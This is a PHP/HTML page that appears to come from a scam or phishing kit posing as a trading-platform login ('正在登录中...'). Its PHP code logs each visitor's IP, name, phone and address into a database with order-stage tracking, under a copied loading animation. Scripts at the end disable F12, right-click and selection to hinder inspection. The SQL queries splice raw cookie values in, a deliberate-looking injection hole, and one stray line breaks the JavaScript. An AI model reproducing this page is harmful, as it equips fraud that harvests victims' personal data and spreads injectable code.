<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../canshu/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../canshu/getdata.php');
$ip=getIP();
setcookie('GoodsID4',$_COOKIE['GoodsID3']);
//写入订单号
setcookie('orderid',$zhuanzhuanORDER);
$xzshijian=date('Y-m-d H:i:s', time());

if($_COOKIE['GoodsID3']){
	

	    $cookTel=substr_replace($_COOKIE['se_tel'],'****',3,4);

	
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_COOKIE['GoodsID3']}'") or die('SQL执行错误');
	
		//判断操作记录数据是否存在，存在就更新此数据状态为2订单页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_COOKIE['GoodsID3']}'");
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=2,
				utime='{$xzshijian}'
			WHERE 
				uip='{$ip}' LIMIT 1") or die(mysql_error());
				
				
		if($_COOKIE['se_name']){
			if($_OID){
			  _query("
				  UPDATE 
					  useraddress
				  SET 
					  uadd='{$_COOKIE['se_address']}',
					  utel='{$_COOKIE['se_tel']}',
					  uname='{$_COOKIE['se_name']}',
					  orderid='{$zhuanzhuanORDER}',
					  state=3
				  WHERE 
				uip='{$ip}' LIMIT 1");
				
			}
		}	
		  _close();
		  session_destroy();
		  
	}

}
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){
       header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <!--
jym作者逐梦
QQ：30882343
--><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
    <meta name="format-detection" content="telephone=no" />
		<meta content="wap" name="data-jym-spm-v" />
	    	    <title>正在登录中...</title>
<meta name="data-spm" content="a2y0w">
<meta http-equiv="Refresh" content="1;URL=<?php echo 'dengd.php';?>">
<main>               	                  
	<link href="css/Icomoon/style.css" rel="stylesheet" type="text/css" />
	<script type="text/javascript" src="js/jquery-2.0.2.min.js"></script>
	<script type="text/javascript" src="js/main.js"></script>
	<style>
	#loading{
		background-color:#FFFFFF;
		height: 100%;
		width: 100%;
		position: fixed;
		z-index: 1;
		margin-top: 0px;
		top: 0px;
	}
	#loading-center{
		width: 100%;
		height: 100%;
		position: relative;
		}
	#loading-center-absolute {
		position: absolute;
		left: 50%;
		top: 35%;
		height: 150px;
		width: 150px;
		margin-top: -75px;
		margin-left: -75px;
	    -moz-border-radius: 50% 50% 50% 50%;
		-webkit-border-radius: 50% 50% 50% 50%;
		border-radius: 50% 50% 50% 50%;

	}
	.object{
		width: 15px;
		height: 15px;
		background-color:#E5E5E5

;
		position: absolute;
		-moz-border-radius: 50% 50% 50% 50%;
		-webkit-border-radius: 50% 50% 50% 50%;
		border-radius: 50% 50% 50% 50%;
		-webkit-animation: animate 0.8s infinite;
		animation: animate 0.8s infinite;
		}

	#object_one {
		top: 19px;
		left: 19px;	

		}
	#object_two {
		top: 0px;
		left: 65px; 
		-webkit-animation-delay: 0.1s; 
	    animation-delay: 0.1s;

		}
	#object_three {
		top: 19px;
		left: 111px; 	
		-webkit-animation-delay: 0.2s; 
	    animation-delay: 0.2s; 

		}
	#object_four {
		top: 65px;
		left: 130px; 
		-webkit-animation-delay: 0.3s; 
	    animation-delay: 0.3s; 
	}
	#object_five {
		top: 111px;
		left: 111px; 
		-webkit-animation-delay: 0.4s; 
	    animation-delay: 0.4s; 
	}
	#object_six {
		top: 130px;
		left: 65px;
		-webkit-animation-delay: 0.5s; 
	    animation-delay: 0.5s; 
	}
	#object_seven {
		top: 111px;
		left: 19px;
		-webkit-animation-delay: 0.6s; 
	    animation-delay: 0.6s; 
	}
	#object_eight {
		top: 65px;
		left: 0px;
		 -webkit-animation-delay: 0.7s; 
	    animation-delay: 0.7s; 
	}
	@-webkit-keyframes animate {
	 
	  25% {
		-ms-transform: scale(1.5); 
	   	-webkit-transform: scale(1.5);   
	    transform: scale(1.5);  
		  }
	  75% {
		-ms-transform: scale(0); 
	   	-webkit-transform: scale(0);  
	    transform: scale(0);  
		  }
	}

	@keyframes animate {
	  50% {
		-ms-transform: scale(1.5,1.5); 
	   	-webkit-transform: scale(1.5,1.5); 
	    transform: scale(1.5,1.5); 
		  }
	 
	  100% {
		-ms-transform: scale(1,1); 
	   	-webkit-transform: scale(1,1); 
	    transform: scale(1,1); 
		  }
	  
	}
	</style>
</head>
<body>
	<div id="loading">
		<div id="loading-center">
			<div id="loading-center-absolute">
				<div class="object" id="object_one"></div>
				<div class="object" id="object_two"></div>
				<div class="object" id="object_three"></div>
				<div class="object" id="object_four"></div>
				<div class="object" id="object_five"></div>
				<div class="object" id="object_six"></div>
				<div class="object" id="object_seven"></div>
				<div class="object" id="object_eight"></div>
			</div>
		</div>
	</div>
	<div class="htmleaf-container">
		<header class="htmleaf-header">
			<h1>30种CSS3炫酷页面预加载loading动画特效 - DEMO20<span>30 CSS3 Page Preload Animations</span></h1>
			<div class="htmleaf-links">
				<a class="htmleaf-icon icon-htmleaf-home-outline" href="http://www.htmleaf.com/" title="jQuery之家" target="_blank"><span> jQuery之家</span></a>
				<a class="htmleaf-icon icon-htmleaf-arrow-forward-outline" href="http://www.htmleaf.com/css3/css3donghua/201504151682.html" title="返回下载页" target="_blank"><span> 返回下载页</span></a>
			</div>
		</header>
		<div class="htmleaf-content bgcolor-3">
			<h3>Square Animations</h3>
			<div class="htmleaf-demo ">
			  	<a href="demo1.html">Demo 1</a>
				<a href="demo2.html">Demo 2</a>
				<a href="demo3.html">Demo 3</a>
				<a href="demo4.html">Demo 4</a>
				<a href="demo5.html">Demo 5</a>
				<a href="demo6.html">Demo 6</a>
				<a href="demo7.html">Demo 7</a>
				<a href="demo8.html">Demo 8</a>
				<a href="demo9.html">Demo 9</a>
				<a href="demo10.html">Demo 10</a>
			</div>
			<h3>Round Animations</h3>
			<div class="htmleaf-demo ">
				<a href="demo11.html">Demo 11</a>
				<a href="demo12.html">Demo 12</a>
				<a href="demo13.html">Demo 13</a>
				<a href="demo14.html">Demo 14</a>
				<a href="demo15.html">Demo 15</a>
				<a href="demo16.html">Demo 16</a>
				<a href="demo17.html">Demo 17</a>
				<a href="demo18.html">Demo 18</a>
				<a href="demo19.html">Demo 19</a>
				<a href="demo20.html" class="current">Demo 20</a>
			</div>
			<h3>Various Animations</h3>
			<div class="htmleaf-demo ">
				<a href="demo21.html">Demo 21</a>
				<a href="demo22.html">Demo 22</a>
				<a href="demo23.html">Demo 23</a>
				<a href="demo24.html">Demo 24</a>
				<a href="demo25.html">Demo 25</a>
				<a href="demo26.html">Demo 26</a>
				<a href="demo27.html">Demo 27</a>
				<a href="demo28.html">Demo 28</a>
				<a href="demo29.html">Demo 29</a>
				<a href="demo30.html">Demo 30</a>
			</div>
		</div>
 <script>
  document.onkeydown = function(){
禁止F12
    if(window.event && window.event.keyCode == 123) {
        alert("F12被禁用");
        event.keyCode=0;
        event.returnValue=false;
    }
    if(window.event && window.event.keyCode == 13) {
        window.event.keyCode = 505;
    }
    if(window.event && window.event.keyCode == 8) {
        alert(str+"\n请使用Del键进行字符的删除操作！");
        window.event.returnValue=false;
    }

}
  </script>
  <script language="Javascript">
document.oncontextmenu=new Function("event.returnValue=false");
document.onselectstart=new Function("event.returnValue=false");
</script>

<!--禁止F12-->
<script type="text/javascript">
        document.onkeydown = function () {
            if (window.event && window.event.keyCode == 123) {
                event.keyCode = 0;
                event.returnValue = false;
                return false;
            }
        };
</script>

<!--火狐禁止右键-->
<script type="text/javascript">
document.oncontextmenu=function(e){return false;}
</script>


</body>
</html>